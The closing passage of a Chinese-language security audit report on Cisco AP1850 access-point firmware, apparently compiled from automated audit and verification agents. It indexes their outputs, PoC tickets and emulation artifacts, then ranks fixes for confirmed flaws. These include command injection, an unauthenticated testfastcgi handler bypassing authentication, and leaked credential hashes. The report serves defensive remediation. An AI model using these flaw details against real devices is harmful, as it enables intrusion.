| unpacker 固件盘点 | `workdir/extracted/air-ap1850-k9-me-8-10-130-0/inventory.md` |
| audit-0 工作总结（fastcgi cmdi/authbypass） | `runs/20260917-045450/agents/audit-0/summary.md` |
| audit-1 工作总结（fastcgi memcorrupt） | `runs/20260917-045450/agents/audit-1/summary.md` |
| audit-2 工作总结（capwapd） | `runs/20260917-045450/agents/audit-2/summary.md` |
| audit-3 工作记录（stilecpd，summary 未产出，以 findings [audit-3] 段为准） | `runs/20260917-045450/agents/audit-3/memory.md` |
| verify-0 工作总结（VULN-2） | `runs/20260917-081629/agents/verify-0/summary.md` |
| verify-1 工作总结（VULN-1） | `runs/20260917-081629/agents/verify-1/summary.md` |
| verify-2 工作总结（VULN-4+VULN-3） | `runs/20260917-081629/agents/verify-2/summary.md` |
| verify-3 工作总结（VULN-5+VULN-9+VULN-10） | `runs/20260917-081629/agents/verify-3/summary.md` |
| 4 份 PoC 工单 skill | `runs/20260917-041115/plan-poc/skills/{vuln-1,vuln-2,vuln-3-4,vuln-5-9-10}/skill.md` |
| rehost ap1g4 仿真实例（本轮持续在线） | QEMU：`sudo pkill -f qemu-system-arm` 停止；内核 /tmp/zImage.armel + /tmp/orig.dtb + FirmAE scratch/300/image.raw；启动命令行见 memory/context.md |
| serial 取证日志（命令执行痕迹本体） | `/tmp/ser34.log`（关键窗口：35404–35408 / 36026–36033 / 35452–35460 / 35901–35910 / 39355–39363 / 43477+） |
| 动态取证产物（宿主 /tmp，仿真生命周期内可复核） | /tmp/v10_body.bin（4608B 泄露 tar）、/tmp/v10_extract/、/tmp/v34_preauth.txt、/tmp/v34_auth.txt、/tmp/v2_ctl.html、/tmp/v5_*.tar/.body/.html（VULN-5 穿越变体全套） |
| rehost ap1g1 unicorn harness（未使用，供后续轮次） | `runs/20260917-041115/agents/rehoster/unicorn_harness_fixed.py`（镜像 ap1g1/ios_unpacked/-，基址 0x80080000，mips-be） |

---

### 修复优先级建议（据终判排序）

1. **立即**：VULN-4（移除 testfastcgi handler 或认证门控——它是 22 个认证后 handler 的无认证旁路，修复一处收敛 VULN-3/5/9/10 的 pre-auth 维度）；VULN-1/2/3 的 sink 改 argv 型 IPC（不经 /bin/sh），参数白名单（clientid/location/wl_maclist 语义均为封闭字符集）。
2. **高**：VULN-9（resetlogin 加认证 + 写入格式修复）；VULN-10（导出包剔除凭据哈希）；VULN-12/13（stilecpd 4040 绑定 loopback/加认证 + dlopen 路径白名单——静态确认但 Critical 级，建议按已实证同级对待）。
3. **中**：VULN-14（wl_unit 校验 + snprintf）；VULN-19/20/21/22（配置级）；移除 lighttpd `cgi.assign(".sh"=>"/bin/sh")`（切断持久化放大器）。
4. **待缺环闭合后**：VULN-11/17（wcpd 审计后定级）、VULN-6/R1、C1。

---

*报告完。动静结论以动态为准；6 条实证均附可复核命令与 serial 行号，证伪项（VULN-5）附变体穷尽与对照实验；未验证项维持静态置信度、未做升级。上一轮（20260915-095054）的 VULN-1/2 "静态确认、动态未复现" 状态在本轮被执行级实证取代，VULN-8 维持撤销。*
